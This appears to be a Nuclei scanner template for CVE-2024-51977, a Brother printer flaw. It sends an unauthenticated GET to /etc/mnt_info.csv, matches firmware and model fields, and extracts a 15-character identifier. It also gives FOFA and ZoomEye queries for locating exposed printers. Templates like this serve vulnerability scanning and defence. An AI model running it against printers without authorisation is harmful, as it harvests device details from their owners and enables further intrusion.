id: CVE-2024-51977

info:
  name: Brother Printers – Information Disclosure
  author: iamnoooob,darses
  severity: medium
  description: |
    An unauthenticated attacker who can access either the HTTP service (TCP port 80), the HTTPS service (TCP port 443), or the IPP service (TCP port 631), can leak several pieces of sensitive information from a vulnerable device. The URI path /etc/mnt_info.csv can be accessed via a GET request and no authentication is required. The returned result is a comma separated value (CSV) table of information. The leaked information includes the device’s model, firmware version, IP address, and serial number.
  reference:
    - https://www.rapid7.com/blog/post/multiple-brother-devices-multiple-vulnerabilities-fixed
    - https://github.com/sfewer-r7/BrotherVulnerabilities
    - https://support.brother.com/g/b/faqend.aspx?c=eu_ot&lang=en&prod=group2&faqid=faq00100846_000
  classification:
    cvss-score: 5.3
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cve-id: CVE-2024-51977
    cwe-id: CWE-538
  metadata:
    fofa-query:
      - app="brother-Printer"
    zoomeye-query:
      - device="brother-Printer" || app="brother-Printer"
  tags: cve,cve2024,brother,exposure


http:
  - raw:
      - |
        GET /etc/mnt_info.csv HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - contains_all(body, 'Main Firmware Version','Model Name') && status_code == 200

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"(\w{15})"'
# digest: 4a0a00473045022100f3a8a3bd716683ead8a85ff79d350ef0912aacebc02cc56aa320c390b219cf6002203cc6982fbada6116511da4430b6f399824084962fa41006a37f81cbbc475098d:922c64590222798bb761d5b6d8e72950